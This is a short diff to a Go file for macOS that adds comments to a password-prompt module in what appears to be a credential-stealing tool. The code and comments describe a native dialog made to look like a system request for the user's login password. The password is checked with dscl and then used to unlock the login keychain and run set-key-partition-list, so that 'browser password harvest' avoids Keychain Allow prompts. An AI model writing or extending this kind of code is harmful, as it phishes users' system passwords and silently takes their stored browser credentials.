@@ -1,5 +1,14 @@
 //go:build darwin
 
+// password_prompt_darwin.go — acquire and validate the macOS login password.
+//
+// Order of sources: -mac-password / KEMATIAN_MAC_PASSWORD, then (unless -no-prompt)
+// a native NSAlert secure-field dialog. The password is validated via dscl -authonly
+// (and Authorization Services as fallback) before harvest continues.
+//
+// The password unlocks the login keychain and runs set-key-partition-list so browser
+// password harvest does not open system Keychain Allow dialogs. This app confirmation
+// modal is intentional; it cannot grant TCC Full Disk Access.
 package main
 
 /*
@@ -234,6 +243,7 @@ var (
 	errPasswordPromptEmpty     = errors.New("password prompt empty")
 )
 
+// showMacPasswordPrompt displays a native secure-field alert (must run on main thread).
 func showMacPasswordPrompt(title, message string, wrongPassword bool) (string, error) {
 	_ = wrongPassword
 	ct := C.CString(title)
@@ -266,6 +276,7 @@ func defaultPromptMessage() string {
 	return fmt.Sprintf("macOS needs your password to continue as \"%s\".", user)
 }
 
+// acquireMacPassword returns a validated Mac login password from flag/env or GUI.
 func acquireMacPassword(fromFlag string, noPrompt bool, title, message string, quiet bool) (string, error) {
 	_ = quiet
 	if p := strings.TrimSpace(fromFlag); p != "" {
